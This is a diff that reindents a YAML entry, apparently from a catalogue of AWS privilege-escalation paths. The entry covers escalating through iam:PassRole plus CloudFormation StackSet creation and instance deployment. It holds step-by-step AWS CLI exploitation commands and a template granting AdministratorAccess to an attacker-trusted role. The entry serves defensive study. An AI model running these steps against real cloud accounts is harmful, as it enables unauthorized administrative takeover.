@@ -2,104 +2,104 @@ id: cloudformation-003
 name: iam:PassRole + cloudformation:CreateStackSet + cloudformation:CreateStackInstances
 category: new-passrole
 services:
-  - iam
-  - cloudformation
+- iam
+- cloudformation
 
 permissions:
   required:
-    - permission: iam:PassRole
-      resourceConstraints: Must have permission to pass a privileged execution role to CloudFormation StackSets
-    - permission: cloudformation:CreateStackSet
-      resourceConstraints: Must have permission to create new CloudFormation StackSets
-    - permission: cloudformation:CreateStackInstances
-      resourceConstraints: Must have permission to deploy stack instances from the StackSet
+  - permission: iam:PassRole
+    resourceConstraints: Must have permission to pass a privileged execution role to CloudFormation StackSets
+  - permission: cloudformation:CreateStackSet
+    resourceConstraints: Must have permission to create new CloudFormation StackSets
+  - permission: cloudformation:CreateStackInstances
+    resourceConstraints: Must have permission to deploy stack instances from the StackSet
 
   additional:
-    - permission: cloudformation:DescribeStackSet
-      resourceConstraints: Helpful for monitoring StackSet creation progress and verifying configuration
-    - permission: cloudformation:DescribeStackSetOperation
-      resourceConstraints: Useful for checking the status of StackSet operations and waiting for completion
-    - permission: cloudformation:ListStackInstances
-      resourceConstraints: Helpful for listing deployed stack instances
-    - permission: iam:ListRoles
-      resourceConstraints: Useful for discovering available privileged roles to pass to StackSets
-    - permission: iam:GetRole
-      resourceConstraints: Helpful for examining role policies to understand what resources can be created
+  - permission: cloudformation:DescribeStackSet
+    resourceConstraints: Helpful for monitoring StackSet creation progress and verifying configuration
+  - permission: cloudformation:DescribeStackSetOperation
+    resourceConstraints: Useful for checking the status of StackSet operations and waiting for completion
+  - permission: cloudformation:ListStackInstances
+    resourceConstraints: Helpful for listing deployed stack instances
+  - permission: iam:ListRoles
+    resourceConstraints: Useful for discovering available privileged roles to pass to StackSets
+  - permission: iam:GetRole
+    resourceConstraints: Helpful for examining role policies to understand what resources can be created
 
 description: A principal with `iam:PassRole`, `cloudformation:CreateStackSet`, and `cloudformation:CreateStackInstances` can escalate privileges by creating a CloudFormation StackSet with a privileged execution role and then deploying stack instances to execute the malicious template. CloudFormation StackSets use a two-step process - `CreateStackSet` defines the template and configuration but does not actually deploy any resources, while `CreateStackInstances` deploys the StackSet to specific target accounts and regions, which triggers the actual resource creation. Both permissions are required for the attack - without `CreateStackInstances`, the StackSet remains just a definition and no malicious resources are created. StackSets use two roles - an administration role (used by the CloudFormation service) and an execution role (used to perform the actual resource creation in each target account). When an attacker passes a privileged execution role and deploys stack instances, they gain the ability to create any AWS resources that execution role has permissions for by defining those resources in the template. This commonly includes IAM resources such as roles with elevated permissions and trust policies allowing the attacker to assume them, effectively enabling the attacker to inherit the execution role's privileges and gain administrative access to the target accounts.
 
 prerequisites:
   admin:
-    - A privileged IAM role must exist that can be passed as a StackSet execution role
-    - The execution role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
-    - An administration role must exist that trusts cloudformation.amazonaws.com and has permissions to assume the execution role
+  - A privileged IAM role must exist that can be passed as a StackSet execution role
+  - The execution role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  - An administration role must exist that trusts cloudformation.amazonaws.com and has permissions to assume the execution role
   lateral:
-    - A privileged IAM role must exist that can be passed as a StackSet execution role
-    - The execution role must have elevated permissions to create the desired resources
-    - An administration role must exist for StackSet operations
+  - A privileged IAM role must exist that can be passed as a StackSet execution role
+  - The execution role must have elevated permissions to create the desired resources
+  - An administration role must exist for StackSet operations
 
 exploitationSteps:
   awscli:
-    - step: 1
-      command: |
-        aws iam list-roles \
-          --query 'Roles[*].{Name:RoleName,Arn:Arn}' \
-          --output table
-      description: List available IAM roles to identify potential execution roles with elevated permissions that can be passed to StackSets
+  - step: 1
+    command: |
+      aws iam list-roles \
+        --query 'Roles[*].{Name:RoleName,Arn:Arn}' \
+        --output table
+    description: List available IAM roles to identify potential execution roles with elevated permissions that can be passed to StackSets
 
-    - step: 2
-      command: |
-        aws iam get-role \
-          --role-name EXECUTION_ROLE_NAME \
-          --query 'Role.{AssumeRolePolicy:AssumeRolePolicyDocument,AttachedPolicies:AttachedManagedPolicies}'
-      description: Examine the execution role's trust policy and attached policies to verify it can be passed to CloudFormation and understand what resources it can create
+  - step: 2
+    command: |
+      aws iam get-role \
+        --role-name EXECUTION_ROLE_NAME \
+        --query 'Role.{AssumeRolePolicy:AssumeRolePolicyDocument,AttachedPolicies:AttachedManagedPolicies}'
+    description: Examine the execution role's trust policy and attached policies to verify it can be passed to CloudFormation and understand what resources it can create
 
-    - step: 3
-      command: |
-        cat > template.yaml << 'EOF'
-        AWSTemplateFormatVersion: '2010-09-09'
-        Description: 'Template defining resources to be created by StackSet'
-        Resources:
-          # Define AWS resources that the execution role has permissions to create
-          # Commonly IAM roles, policies, or other privileged resources
-        EOF
-      description: Create a CloudFormation template defining the resources to be created. The template should include resources that provide privilege escalation, such as IAM roles with trust policies allowing you to assume them
+  - step: 3
+    command: |
+      cat > template.yaml << 'EOF'
+      AWSTemplateFormatVersion: '2010-09-09'
+      Description: 'Template defining resources to be created by StackSet'
+      Resources:
+        # Define AWS resources that the execution role has permissions to create
+        # Commonly IAM roles, policies, or other privileged resources
+      EOF
+    description: Create a CloudFormation template defining the resources to be created. The template should include resources that provide privilege escalation, such as IAM roles with trust policies allowing you to assume them
 
-    - step: 4
-      command: |
-        aws cloudformation create-stack-set \
-          --stack-set-name escalation-stackset \
-          --template-body file://template.yaml \
-          --administration-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
-          --execution-role-name EXECUTION_ROLE_NAME \
-          --capabilities CAPABILITY_NAMED_IAM
-      description: Create a CloudFormation StackSet, passing the privileged execution role via iam:PassRole. The StackSet will use this role's permissions when deploying stack instances
+  - step: 4
+    command: |
+      aws cloudformation create-stack-set \
+        --stack-set-name escalation-stackset \
+        --template-body file://template.yaml \
+        --administration-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+        --execution-role-name EXECUTION_ROLE_NAME \
+        --capabilities CAPABILITY_NAMED_IAM
+    description: Create a CloudFormation StackSet, passing the privileged execution role via iam:PassRole. The StackSet will use this role's permissions when deploying stack instances
 
-    - step: 5
-      command: |
-        aws cloudformation create-stack-instances \
-          --stack-set-name escalation-stackset \
-          --accounts ACCOUNT_ID \
-          --regions REGION \
-          --operation-preferences FailureToleranceCount=0,MaxConcurrentCount=1
-      description: Deploy a stack instance from the StackSet to the target account and region. The execution role will create the resources defined in the template
+  - step: 5
+    command: |
+      aws cloudformation create-stack-instances \
+        --stack-set-name escalation-stackset \
+        --accounts ACCOUNT_ID \
+        --regions REGION \
+        --operation-preferences FailureToleranceCount=0,MaxConcurrentCount=1
+    description: Deploy a stack instance from the StackSet to the target account and region. The execution role will create the resources defined in the template
 
-    - step: 6
-      command: |
-        aws cloudformation describe-stack-set-operation \
-          --stack-set-name escalation-stackset \
-          --operation-id OPERATION_ID \
-          --query 'StackSetOperation.Status'
-      description: Monitor the StackSet operation status until it shows SUCCEEDED, indicating the resources have been created
+  - step: 6
+    command: |
+      aws cloudformation describe-stack-set-operation \
+        --stack-set-name escalation-stackset \
+        --operation-id OPERATION_ID \
+        --query 'StackSetOperation.Status'
+    description: Monitor the StackSet operation status until it shows SUCCEEDED, indicating the resources have been created
 
-    - step: 7
-      command: |
-        # Use the newly created resources to escalate privileges
-        # For example, assume a newly created IAM role:
-        aws sts assume-role \
-          --role-arn arn:aws:iam::ACCOUNT_ID:role/CREATED_ROLE \
-          --role-session-name escalation-session
-      description: Leverage the newly created resources to escalate privileges, such as assuming a newly created IAM role with elevated permissions
+  - step: 7
+    command: |
+      # Use the newly created resources to escalate privileges
+      # For example, assume a newly created IAM role:
+      aws sts assume-role \
+        --role-arn arn:aws:iam::ACCOUNT_ID:role/CREATED_ROLE \
+        --role-session-name escalation-session
+    description: Leverage the newly created resources to escalate privileges, such as assuming a newly created IAM role with elevated permissions
 
 recommendation: |
   High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
@@ -147,17 +147,17 @@ discoveryAttribution:
     date: 2018
     link: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
 references:
-  - title: "AWS IAM Privilege Escalation – Methods and Mitigation - Rhino Security Labs"
-    url: "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
-  - title: "How to implement the principle of least privilege with CloudFormation StackSets - AWS Security Blog"
-    url: "https://aws.amazon.com/blogs/security/how-to-implement-the-principle-of-least-privilege-with-cloudformation-stacksets/"
-  - title: "Grant self-managed permissions - AWS CloudFormation Documentation"
-    url: "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/stacksets-prereqs-self-managed.html"
+- title: "AWS IAM Privilege Escalation – Methods and Mitigation - Rhino Security Labs"
+  url: "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+- title: "How to implement the principle of least privilege with CloudFormation StackSets - AWS Security Blog"
+  url: "https://aws.amazon.com/blogs/security/how-to-implement-the-principle-of-least-privilege-with-cloudformation-stacksets/"
+- title: "Grant self-managed permissions - AWS CloudFormation Documentation"
+  url: "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/stacksets-prereqs-self-managed.html"
 
 relatedPaths:
-  - cloudformation-001
-  - cloudformation-002
-  - cloudformation-004
+- cloudformation-001
+- cloudformation-002
+- cloudformation-004
 
 learningEnvironments:
   pathfinding-labs:
@@ -168,150 +168,150 @@ learningEnvironments:
 
 attackVisualization:
   nodes:
-    - id: start
-      label: Starting Principal
-      type: principal
-      description: |
-        The principal with `iam:PassRole`, `cloudformation:CreateStackSet`, and `cloudformation:CreateStackInstances` permissions. Can be an IAM user or role. This principal will create a StackSet and deploy stack instances to escalate privileges.
+  - id: start
+    label: Starting Principal
+    type: principal
+    description: |
+      The principal with `iam:PassRole`, `cloudformation:CreateStackSet`, and `cloudformation:CreateStackInstances` permissions. Can be an IAM user or role. This principal will create a StackSet and deploy stack instances to escalate privileges.
 
-    - id: stackset
-      label: New CloudFormation StackSet
-      type: resource
-      description: |
-        A newly created CloudFormation StackSet that defines a template to be deployed across target accounts and regions. The StackSet is configured with both an administration role (used by the CloudFormation service to manage the StackSet) and an execution role (used to create resources in target accounts). The attacker controls the template content, allowing them to define any AWS resources that the execution role has permissions to create. Note that creating the StackSet alone does not deploy any resources - `CreateStackInstances` is required to actually provision resources.
+  - id: stackset
+    label: New CloudFormation StackSet
+    type: resource
+    description: |
+      A newly created CloudFormation StackSet that defines a template to be deployed across target accounts and regions. The StackSet is configured with both an administration role (used by the CloudFormation service to manage the StackSet) and an execution role (used to create resources in target accounts). The attacker controls the template content, allowing them to define any AWS resources that the execution role has permissions to create. Note that creating the StackSet alone does not deploy any resources - `CreateStackInstances` is required to actually provision resources.
 
-    - id: execution_role
-      label: Existing Execution Role
-      type: principal
-      description: |
-        The privileged IAM role passed to the StackSet as the execution role. This role must exist in the target account(s) and is used by CloudFormation to create the resources defined in the template. The role's permissions determine what resources can be created and thus the extent of privilege escalation possible. The execution role must have an appropriate trust policy allowing CloudFormation to assume it.
+  - id: execution_role
+    label: Existing Execution Role
+    type: principal
+    description: |
+      The privileged IAM role passed to the StackSet as the execution role. This role must exist in the target account(s) and is used by CloudFormation to create the resources defined in the template. The role's permissions determine what resources can be created and thus the extent of privilege escalation possible. The execution role must have an appropriate trust policy allowing CloudFormation to assume it.
 
-    - id: template_execution
-      label: Template Executes and Creates Resources
-      type: payload
-      color: '#99ccff'
-      description: |
-        Stack instances are deployed using `cloudformation:CreateStackInstances`, which triggers the actual resource provisioning. The CloudFormation template executes in the target account(s) with the execution role's permissions. Common resources for privilege escalation include:
+  - id: template_execution
+    label: Template Executes and Creates Resources
+    type: payload
+    color: '#99ccff'
+    description: |
+      Stack instances are deployed using `cloudformation:CreateStackInstances`, which triggers the actual resource provisioning. The CloudFormation template executes in the target account(s) with the execution role's permissions. Common resources for privilege escalation include:
 
-        - IAM roles with trust policies allowing the attacker to assume them
-        - IAM users with access keys for the attacker
-        - Lambda functions that execute privileged actions
-        - IAM policies that grant elevated permissions to the starting principal
-        - EC2 instances with User Data scripts that exfiltrate credentials
+      - IAM roles with trust policies allowing the attacker to assume them
+      - IAM users with access keys for the attacker
+      - Lambda functions that execute privileged actions
+      - IAM policies that grant elevated permissions to the starting principal
+      - EC2 instances with User Data scripts that exfiltrate credentials
 
-        Example template snippet for privilege escalation:
-        ```yaml
-        Resources:
-          PrivilegedRole:
-            Type: AWS::IAM::Role
-            Properties:
-              AssumeRolePolicyDocument:
-                Statement:
-                  - Effect: Allow
-                    Principal:
-                      AWS: arn:aws:iam::ACCOUNT_ID:user/ATTACKER
-                    Action: sts:AssumeRole
-              ManagedPolicyArns:
-                - arn:aws:iam::aws:policy/AdministratorAccess
-        ```
+      Example template snippet for privilege escalation:
+      ```yaml
+      Resources:
+        PrivilegedRole:
+          Type: AWS::IAM::Role
+          Properties:
+            AssumeRolePolicyDocument:
+              Statement:
+                - Effect: Allow
+                  Principal:
+                    AWS: arn:aws:iam::ACCOUNT_ID:user/ATTACKER
+                  Action: sts:AssumeRole
+            ManagedPolicyArns:
+              - arn:aws:iam::aws:policy/AdministratorAccess
+      ```
 
-        The attacker then leverages the newly created resources to escalate privileges.
+      The attacker then leverages the newly created resources to escalate privileges.
 
-    - id: admin
-      label: Effective Administrator
-      type: outcome
-      description: |
-        If the execution role has administrative permissions (AdministratorAccess or equivalent), the template successfully creates resources that grant the attacker full administrative access to the target account(s). The attacker can assume newly created privileged roles, use generated access keys, or leverage other resources to gain complete control.
+  - id: admin
+    label: Effective Administrator
+    type: outcome
+    description: |
+      If the execution role has administrative permissions (AdministratorAccess or equivalent), the template successfully creates resources that grant the attacker full administrative access to the target account(s). The attacker can assume newly created privileged roles, use generated access keys, or leverage other resources to gain complete control.
 
-    - id: some_perms
-      label: Some additional access
-      type: outcome
-      color: '#ffeb99'
-      description: |
-        If the execution role has some elevated permissions but not full admin, the template creates resources that grant partial privilege escalation. This could include access to sensitive data (S3, RDS, DynamoDB), security configuration changes, or resources that enable additional privilege escalation paths.
+  - id: some_perms
+    label: Some additional access
+    type: outcome
+    color: '#ffeb99'
+    description: |
+      If the execution role has some elevated permissions but not full admin, the template creates resources that grant partial privilege escalation. This could include access to sensitive data (S3, RDS, DynamoDB), security configuration changes, or resources that enable additional privilege escalation paths.
 
-    - id: no_access
-      label: No additional access
-      type: outcome
-      color: '#cccccc'
-      description: |
-        If the execution role only has minimal permissions, the template cannot create resources that provide meaningful privilege escalation. However, even limited access might be useful for reconnaissance or as part of a multi-hop attack chain.
+  - id: no_access
+    label: No additional access
+    type: outcome
+    color: '#cccccc'
+    description: |
+      If the execution role only has minimal permissions, the template cannot create resources that provide meaningful privilege escalation. However, even limited access might be useful for reconnaissance or as part of a multi-hop attack chain.
 
   edges:
-    - from: start
-      to: stackset
-      label: iam:PassRole + cloudformation:CreateStackSet
-      description: |
-        Create a new CloudFormation StackSet and pass the privileged execution role to it. The StackSet defines the template and configuration for deploying resources across accounts and regions.
+  - from: start
+    to: stackset
+    label: iam:PassRole + cloudformation:CreateStackSet
+    description: |
+      Create a new CloudFormation StackSet and pass the privileged execution role to it. The StackSet defines the template and configuration for deploying resources across accounts and regions.
 
-        Command:
-        ```bash
-        aws cloudformation create-stack-set \
-          --stack-set-name escalation-stackset \
-          --template-body file://template.yaml \
-          --administration-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
-          --execution-role-name EXECUTION_ROLE_NAME \
-          --capabilities CAPABILITY_NAMED_IAM
-        ```
+      Command:
+      ```bash
+      aws cloudformation create-stack-set \
+        --stack-set-name escalation-stackset \
+        --template-body file://template.yaml \
+        --administration-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+        --execution-role-name EXECUTION_ROLE_NAME \
+        --capabilities CAPABILITY_NAMED_IAM
+      ```
 
-        The template.yaml contains malicious resource definitions that will be created with the execution role's permissions. The `--capabilities CAPABILITY_NAMED_IAM` flag is required when creating IAM resources.
+      The template.yaml contains malicious resource definitions that will be created with the execution role's permissions. The `--capabilities CAPABILITY_NAMED_IAM` flag is required when creating IAM resources.
 
-    - from: stackset
-      to: execution_role
-      label: StackSet configured with execution role
-      description: |
-        The StackSet is configured to use the execution role for all resource creation operations in target accounts. When stack instances are deployed, CloudFormation will assume this role to provision resources defined in the template.
+  - from: stackset
+    to: execution_role
+    label: StackSet configured with execution role
+    description: |
+      The StackSet is configured to use the execution role for all resource creation operations in target accounts. When stack instances are deployed, CloudFormation will assume this role to provision resources defined in the template.
 
-    - from: execution_role
-      to: template_execution
-      label: cloudformation:CreateStackInstances
-      description: |
-        Deploy stack instances from the StackSet to target accounts and regions. This is when the actual resource provisioning occurs - the execution role's credentials are used by CloudFormation to create resources in each target location.
+  - from: execution_role
+    to: template_execution
+    label: cloudformation:CreateStackInstances
+    description: |
+      Deploy stack instances from the StackSet to target accounts and regions. This is when the actual resource provisioning occurs - the execution role's credentials are used by CloudFormation to create resources in each target location.
 
-        Command to create stack instances:
-        ```bash
-        aws cloudformation create-stack-instances \
-          --stack-set-name escalation-stackset \
-          --accounts ACCOUNT_ID \
-          --regions REGION \
-          --operation-preferences FailureToleranceCount=0,MaxConcurrentCount=1
-        ```
+      Command to create stack instances:
+      ```bash
+      aws cloudformation create-stack-instances \
+        --stack-set-name escalation-stackset \
+        --accounts ACCOUNT_ID \
+        --regions REGION \
+        --operation-preferences FailureToleranceCount=0,MaxConcurrentCount=1
+      ```
 
-        Monitor deployment progress:
-        ```bash
-        aws cloudformation describe-stack-set-operation \
-          --stack-set-name escalation-stackset \
-          --operation-id OPERATION_ID \
-          --query 'StackSetOperation.Status'
-        ```
+      Monitor deployment progress:
+      ```bash
+      aws cloudformation describe-stack-set-operation \
+        --stack-set-name escalation-stackset \
+        --operation-id OPERATION_ID \
+        --query 'StackSetOperation.Status'
+      ```
 
-    - from: template_execution
-      to: admin
-      label: If execution role has admin permissions
-      branch: A
-      condition: admin
-      description: |
-        If the execution role has AdministratorAccess or equivalent administrative permissions, the template successfully creates resources that grant the attacker full control over the target account(s). For example, the template could create an IAM role with a trust policy allowing the attacker to assume it, or create an IAM user with access keys.
+  - from: template_execution
+    to: admin
+    label: If execution role has admin permissions
+    branch: A
+    condition: admin
+    description: |
+      If the execution role has AdministratorAccess or equivalent administrative permissions, the template successfully creates resources that grant the attacker full control over the target account(s). For example, the template could create an IAM role with a trust policy allowing the attacker to assume it, or create an IAM user with access keys.
 
-        Example follow-up command to assume newly created role:
-        ```bash
-        aws sts assume-role \
-          --role-arn arn:aws:iam::ACCOUNT_ID:role/CREATED_ROLE \
-          --role-session-name escalation-session
-        ```
+      Example follow-up command to assume newly created role:
+      ```bash
+      aws sts assume-role \
+        --role-arn arn:aws:iam::ACCOUNT_ID:role/CREATED_ROLE \
+        --role-session-name escalation-session
+      ```
 
-    - from: template_execution
-      to: some_perms
-      label: If execution role has some permissions
-      branch: B
-      condition: some_permissions
-      description: |
-        If the execution role has elevated but non-administrative permissions, the template creates resources that grant partial privilege escalation. The attacker gains access to data, can modify security configurations, or obtains resources that enable additional attacks.
+  - from: template_execution
+    to: some_perms
+    label: If execution role has some permissions
+    branch: B
+    condition: some_permissions
+    description: |
+      If the execution role has elevated but non-administrative permissions, the template creates resources that grant partial privilege escalation. The attacker gains access to data, can modify security configurations, or obtains resources that enable additional attacks.
 
-    - from: template_execution
-      to: no_access
-      label: If execution role has minimal permissions
-      branch: C
-      condition: no_permissions
-      description: |
-        If the execution role only has minimal or non-sensitive permissions, the template cannot create resources that provide meaningful privilege escalation. The attack may yield limited results, though reconnaissance information might still be valuable.
+  - from: template_execution
+    to: no_access
+    label: If execution role has minimal permissions
+    branch: C
+    condition: no_permissions
+    description: |
+      If the execution role only has minimal or non-sensitive permissions, the template cannot create resources that provide meaningful privilege escalation. The attack may yield limited results, though reconnaissance information might still be valuable.
